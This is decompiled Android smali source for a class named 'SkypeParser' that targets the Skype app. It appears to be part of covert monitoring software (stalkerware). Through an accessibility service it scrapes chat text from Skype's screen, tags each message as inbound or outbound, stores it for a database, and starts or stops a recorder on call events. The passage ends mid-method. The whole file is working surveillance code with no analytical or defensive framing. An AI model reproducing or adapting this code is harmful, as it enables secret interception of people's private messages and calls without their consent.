.class public Lhw/imreader/k;
.super Lhw/imreader/a;
.source ""


# static fields
.field static final r:Ljava/lang/String;

.field private static s:Ljava/lang/ref/WeakReference;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/lang/ref/WeakReference<",
            "Lhw/imreader/k;",
            ">;"
        }
    .end annotation
.end field


# instance fields
.field private q:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const-string v0, "com.skype.raider"

    invoke-static {v0}, Lhw/utils/o;->B(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lhw/imreader/k;->r:Ljava/lang/String;

    const/4 v0, 0x0

    sput-object v0, Lhw/imreader/k;->s:Ljava/lang/ref/WeakReference;

    return-void
.end method

.method protected constructor <init>(Landroid/content/Context;)V
    .locals 2

    sget-object v0, Lhw/imreader/k;->r:Ljava/lang/String;

    const/4 v1, 0x1

    invoke-direct {p0, p1, v0, v1}, Lhw/imreader/a;-><init>(Landroid/content/Context;Ljava/lang/String;I)V

    const/4 p1, 0x0

    iput-object p1, p0, Lhw/imreader/k;->q:Ljava/lang/String;

    const-string p1, "SkypeParser"

    const-string v0, "creating SkypeEventParser"

    invoke-static {p1, v0}, Lhw/utils/l;->s(Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method

.method private m0(Landroid/view/accessibility/AccessibilityNodeInfo;)Ljava/lang/String;
    .locals 6

    const-string v0, "android.widget.Button"

    invoke-static {p1, v0}, Lhw/imreader/a;->E(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Ljava/util/ArrayList;

    move-result-object p1

    invoke-virtual {p1}, Ljava/util/ArrayList;->size()I

    move-result v0

    const/4 v1, 0x0

    if-lez v0, :cond_4

    invoke-virtual {p1}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :cond_0
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_3

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v3

    const/4 v4, 0x2

    if-le v3, v4, :cond_0

    const-string v3, "android.widget.TextView"

    invoke-static {v2, v3}, Lhw/imreader/a;->E(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Ljava/util/ArrayList;

    move-result-object v3

    invoke-virtual {v3}, Ljava/util/ArrayList;->size()I

    move-result v4

    const/4 v5, 0x1

    if-le v4, v5, :cond_0

    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v0

    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :cond_1
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v4

    if-eqz v4, :cond_2

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v4

    invoke-interface {v4}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v4}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v4

    if-nez v4, :cond_1

    const/4 v0, 0x0

    invoke-virtual {v3, v0}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v0

    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v1

    :cond_2
    invoke-static {v3}, Lhw/imreader/a;->V(Ljava/util/List;)V

    :cond_3
    invoke-static {p1}, Lhw/imreader/a;->V(Ljava/util/List;)V

    :cond_4
    return-object v1
.end method

.method static n0(Landroid/content/Context;)Lhw/imreader/k;
    .locals 1

    sget-object v0, Lhw/imreader/k;->s:Ljava/lang/ref/WeakReference;

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Ljava/lang/ref/WeakReference;->get()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lhw/imreader/k;

    if-eqz v0, :cond_0

    return-object v0

    :cond_0
    new-instance v0, Lhw/imreader/k;

    invoke-direct {v0, p0}, Lhw/imreader/k;-><init>(Landroid/content/Context;)V

    sget-object p0, Lhw/imreader/k;->s:Ljava/lang/ref/WeakReference;

    if-eqz p0, :cond_1

    invoke-virtual {p0}, Ljava/lang/ref/WeakReference;->clear()V

    :cond_1
    new-instance p0, Ljava/lang/ref/WeakReference;

    invoke-direct {p0, v0}, Ljava/lang/ref/WeakReference;-><init>(Ljava/lang/Object;)V

    sput-object p0, Lhw/imreader/k;->s:Ljava/lang/ref/WeakReference;

    return-object v0
.end method

.method private p0(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/util/HashMap;[ZLjava/lang/String;)Z
    .locals 16
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/view/accessibility/AccessibilityNodeInfo;",
            "Ljava/util/HashMap<",
            "Ljava/lang/Integer;",
            "Ljava/lang/String;",
            ">;[Z",
            "Ljava/lang/String;",
            ")Z"
        }
    .end annotation

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    const/4 v2, 0x1

    if-eqz v1, :cond_f

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v3

    if-lez v3, :cond_f

    const/4 v3, 0x0

    invoke-virtual {v1, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-eqz v1, :cond_f

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v4

    const/4 v5, 0x3

    const-string v6, "\n"

    const-string v7, "SkypeParser"

    const-string v8, "android.widget.TextView"

    const-string v9, ""

    if-le v4, v5, :cond_3

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v4

    invoke-virtual {v8, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_3

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v4

    if-eqz v4, :cond_2

    invoke-virtual {v0, v1}, Lhw/imreader/a;->C(Landroid/view/accessibility/AccessibilityNodeInfo;)I

    move-result v4

    invoke-static {v1, v8}, Lhw/imreader/a;->E(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Ljava/util/ArrayList;

    move-result-object v5

    invoke-virtual {v5}, Ljava/util/ArrayList;->size()I

    move-result v7

    const-string v8, "#"

    if-lez v7, :cond_1

    invoke-virtual {v5, v3}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v7

    if-eqz v7, :cond_0

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v3}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v9}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v9

    invoke-interface {v9}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v7, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    move-object v9, v7

    :cond_0
    invoke-static {v5}, Lhw/imreader/a;->V(Ljava/util/List;)V

    :cond_1
    invoke-static {v9}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_c

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v1

    invoke-interface {v1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    move-object v9, v1

    goto/16 :goto_5

    :cond_2
    const-string v4, " --- EMP DT: \n"

    invoke-static {v7, v4}, Lhw/utils/l;->t(Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {v1}, Lhw/imreader/l;->t(Landroid/view/accessibility/AccessibilityNodeInfo;)Ljava/lang/String;

    goto/16 :goto_4

    :cond_3
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v4

    if-ne v4, v2, :cond_b

    invoke-static {v1, v8}, Lhw/imreader/a;->E(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Ljava/util/ArrayList;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/ArrayList;->size()I

    move-result v4

    if-le v4, v2, :cond_b

    invoke-virtual {v1}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v4

    move-object v10, v9

    move-object v11, v10

    const/4 v5, 0x0

    const/4 v8, 0x0

    :goto_0
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    move-result v12

    if-eqz v12, :cond_a

    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v12

    check-cast v12, Landroid/view/accessibility/AccessibilityNodeInfo;

    const-string v13, " --- SKIP "

    if-lez v8, :cond_4

    add-int/lit8 v8, v8, -0x1

    new-instance v14, Ljava/lang/StringBuilder;

    invoke-direct {v14}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v14, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v12

    invoke-virtual {v14, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v14}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-static {v7, v12}, Lhw/utils/l;->t(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_2

    :cond_4
    invoke-virtual {v12}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v14

    if-eqz v14, :cond_8

    invoke-virtual {v12}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v14

    invoke-interface {v14}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v14

    const-string v15, "yes"

    invoke-virtual {v14, v15}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v15

    if-eqz v15, :cond_5

    invoke-virtual {v12}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v15

    const/4 v3, 0x2

    move-object/from16 p1, v4

    if-eqz v15, :cond_6

    invoke-virtual {v15}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v4

    if-ne v4, v3, :cond_6

    invoke-virtual {v15, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    if-eqz v4, :cond_6

    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v4

    const-string v15, "android.widget.ImageView"

    invoke-virtual {v15, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_6

    const/4 v8, 0x2

    goto :goto_1

    :cond_5
    move-object/from16 p1, v4

    invoke-virtual {v0, v14}, Lhw/imreader/a;->M(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_6

    invoke-virtual {v12}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    if-eqz v3, :cond_6

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v4

    if-eqz v4, :cond_6

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v4

    const-string v15, "android.view.ViewGroup"

    invoke-virtual {v15, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_6

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v4

    if-ne v4, v2, :cond_6

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v3

    invoke-interface {v3}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v3

    const-string v4, " 0 "

    invoke-virtual {v3, v4}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v3

    const/4 v4, -0x1

    if-ne v3, v4, :cond_6

    const/4 v8, 0x1

    :cond_6
    :goto_1
    if-ge v8, v2, :cond_7

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v11, v9}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_9

    invoke-virtual {v0, v12}, Lhw/imreader/a;->C(Landroid/view/accessibility/AccessibilityNodeInfo;)I

    move-result v5

    move-object v11, v6

    goto :goto_3

    :cond_7
    add-int/lit8 v8, v8, -0x1

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v7, v3}, Lhw/utils/l;->t(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_3

    :cond_8
    :goto_2
    move-object/from16 p1, v4

    :cond_9
    :goto_3
    move-object/from16 v4, p1

    const/4 v3, 0x0

    goto/16 :goto_0

    :cond_a
    invoke-static {v1}, Lhw/imreader/a;->V(Ljava/util/List;)V

    move v4, v5

    move-object v9, v10

    goto :goto_5

    :cond_b
    :goto_4
    const/4 v4, 0x0

    :cond_c
    :goto_5
    invoke-static {v9}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_f

    const/4 v1, 0x0

    aget-boolean v3, p3, v1

    if-eqz v3, :cond_e

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v3, p4

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/String;->length()I

    move-result v3

    const/16 v5, 0x14

    if-le v3, v5, :cond_d

    invoke-virtual {v9, v1, v5}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v3

    goto :goto_6

    :cond_d
    move-object v3, v9

    :goto_6
    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Lhw/imreader/a;->Z(Ljava/lang/String;)Z

    move-result v2

    aput-boolean v1, p3, v1

    :cond_e
    if-eqz v2, :cond_f

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    move-object/from16 v3, p2

    invoke-virtual {v3, v1, v9}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    :cond_f
    return v2
.end method


# virtual methods
.method J()V
    .locals 4

    invoke-super {p0}, Lhw/imreader/a;->J()V

    iget-object v0, p0, Lhw/imreader/a;->i:Ljava/util/HashMap;

    sget-object v1, Lhw/imreader/a$b;->c:Lhw/imreader/a$b;

    sget-object v2, Lhw/utils/b0;->o:Landroid/content/Context;

    sget v3, Lhw/imreader/j;->U:I

    invoke-virtual {v2, v3}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    iget-object v0, p0, Lhw/imreader/a;->i:Ljava/util/HashMap;

    sget-object v1, Lhw/imreader/a$b;->d:Lhw/imreader/a$b;

    sget-object v2, Lhw/utils/b0;->o:Landroid/content/Context;

    sget v3, Lhw/imreader/j;->Z:I

    invoke-virtual {v2, v3}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    iget-object v0, p0, Lhw/imreader/a;->i:Ljava/util/HashMap;

    sget-object v1, Lhw/imreader/a$b;->e:Lhw/imreader/a$b;

    sget-object v2, Lhw/utils/b0;->o:Landroid/content/Context;

    sget v3, Lhw/imreader/j;->X:I

    invoke-virtual {v2, v3}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    return-void
.end method

.method N(ILandroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;Z)Z
    .locals 9

    invoke-static {}, Lhw/recorder/d;->l()Z

    move-result p1

    const/4 p3, 0x0

    if-eqz p1, :cond_8

    const-string p1, "android.widget.Button"

    invoke-static {p2, p1}, Lhw/imreader/a;->E(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Ljava/util/ArrayList;

    move-result-object p1

    invoke-virtual {p1}, Ljava/util/ArrayList;->size()I

    move-result p2

    if-lez p2, :cond_8

    invoke-virtual {p1}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object p2

    const/4 v0, 0x0

    move-object v3, v0

    move-object v4, v3

    move-object v5, v4

    const/4 v0, 0x0

    :cond_0
    :goto_0
    invoke-interface {p2}, Ljava/util/Iterator;->hasNext()Z

    move-result v1

    if-eqz v1, :cond_7

    invoke-interface {p2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v2

    const/4 v6, 0x1

    if-eqz v2, :cond_2

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v1

    invoke-interface {v1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v1

    iget-object v2, p0, Lhw/imreader/a;->f:Landroid/content/Context;

    sget v7, Lhw/imreader/j;->E:I

    invoke-virtual {v2, v7}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_1

    sget-object v4, Lhw/database/ValsDB$MESSAGE_DIRECTION;->INBOUND:Lhw/database/ValsDB$MESSAGE_DIRECTION;

    :goto_1
    const/4 v0, 0x1

    goto :goto_0

    :cond_1
    iget-object v2, p0, Lhw/imreader/a;->f:Landroid/content/Context;

    sget v7, Lhw/imreader/j;->G:I

    invoke-virtual {v2, v7}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_0

    goto :goto_1

    :cond_2
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v2

    const/4 v7, 0x2

    if-ne v2, v7, :cond_0

    const-string v2, "android.widget.TextView"

    invoke-static {v1, v2}, Lhw/imreader/a;->E(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Ljava/util/ArrayList;

    move-result-object v2

    invoke-virtual {v2}, Ljava/util/ArrayList;->size()I

    move-result v8

    if-lez v8, :cond_6

    invoke-virtual {v2, p3}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v1

    if-eqz v1, :cond_5

    invoke-virtual {v2, p3}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v1

    invoke-interface {v1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2}, Ljava/util/ArrayList;->size()I

    move-result v1

    if-ne v1, v7, :cond_4

    invoke-virtual {v2, v6}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v1

    invoke-interface {v1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v1

    iget-object v7, p0, Lhw/imreader/a;->f:Landroid/content/Context;

    sget v8, Lhw/imreader/j;->F:I

    invoke-virtual {v7, v8}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v1, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_3

    sget-object v4, Lhw/database/ValsDB$MESSAGE_DIRECTION;->OUTBOUND:Lhw/database/ValsDB$MESSAGE_DIRECTION;

    sget-object v5, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    goto :goto_3

    :cond_3
    invoke-virtual {v2, v6}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v1

    invoke-interface {v1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v1

    iget-object v6, p0, Lhw/imreader/a;->f:Landroid/content/Context;

    sget v7, Lhw/imreader/j;->D:I

    invoke-virtual {v6, v7}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v1, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_5

    sget-object v4, Lhw/database/ValsDB$MESSAGE_DIRECTION;->OUTBOUND:Lhw/database/ValsDB$MESSAGE_DIRECTION;

    goto :goto_2

    :cond_4
    invoke-virtual {v2}, Ljava/util/ArrayList;->size()I

    move-result v1

    if-le v1, v7, :cond_5

    :goto_2
    sget-object v5, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    :cond_5
    :goto_3
    invoke-static {v2}, Lhw/imreader/a;->V(Ljava/util/List;)V

    goto/16 :goto_0

    :cond_6
    const-string v2, "SkypeParser"

    const-string v6, " --- WRN CNT ---"

    invoke-static {v2, v6}, Lhw/utils/l;->t(Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {v1}, Lhw/imreader/l;->t(Landroid/view/accessibility/AccessibilityNodeInfo;)Ljava/lang/String;

    goto/16 :goto_0

    :cond_7
    invoke-static {p1}, Lhw/imreader/a;->V(Ljava/util/List;)V

    if-eqz v0, :cond_8

    iget v1, p0, Lhw/imreader/a;->g:I

    const/4 v2, 0x0

    move v6, p4

    invoke-static/range {v1 .. v6}, Lhw/recorder/d;->u(ILhw/recorder/d$b;Ljava/lang/String;Lhw/database/ValsDB$MESSAGE_DIRECTION;Ljava/lang/Boolean;Z)Z

    :cond_8
    return p3
.end method

.method o0(Landroid/view/accessibility/AccessibilityEvent;Landroid/view/accessibility/AccessibilityNodeInfo;I)V
    .locals 22

    move-object/from16 v1, p0

    move-object/from16 v0, p1

    move-object/from16 v2, p2

    const-string v3, "\n"

    const-string v4, "android:id/content"

    const-string v5, "SkypeParser"

    :try_start_0
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v6

    invoke-static {v0, v2, v6}, Lhw/imreader/l;->Z(Landroid/view/accessibility/AccessibilityEvent;Landroid/view/accessibility/AccessibilityNodeInfo;I)V

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getContentChangeTypes()I

    move-result v6

    const/4 v7, 0x4

    const/4 v8, 0x0

    if-ne v6, v7, :cond_2

    const-string v0, "android.widget.Button"

    invoke-virtual/range {p2 .. p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-virtual/range {p2 .. p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v0

    if-eqz v0, :cond_1

    invoke-virtual/range {p2 .. p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v0

    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0

    iget-object v2, v1, Lhw/imreader/a;->f:Landroid/content/Context;

    sget v3, Lhw/imreader/j;->I:I

    invoke-virtual {v2, v3}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_0

    iget-object v0, v1, Lhw/imreader/k;->q:Ljava/lang/String;

    invoke-virtual {v1, v0}, Lhw/imreader/a;->a0(Ljava/lang/String;)V

    const-string v0, " --- REC B "

    :goto_0
    invoke-static {v5, v0}, Lhw/utils/l;->t(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_c

    :cond_0
    iget-object v2, v1, Lhw/imreader/a;->f:Landroid/content/Context;

    sget v3, Lhw/imreader/j;->H:I

    invoke-virtual {v2, v3}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_15

    invoke-virtual/range {p0 .. p0}, Lhw/imreader/a;->c0()V

    const-string v0, " --- REC E "

    goto :goto_0

    :cond_1
    invoke-virtual/range {p2 .. p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v0

    const/4 v3, 0x2

    if-ne v0, v3, :cond_15

    const-string v0, "android.widget.TextView"

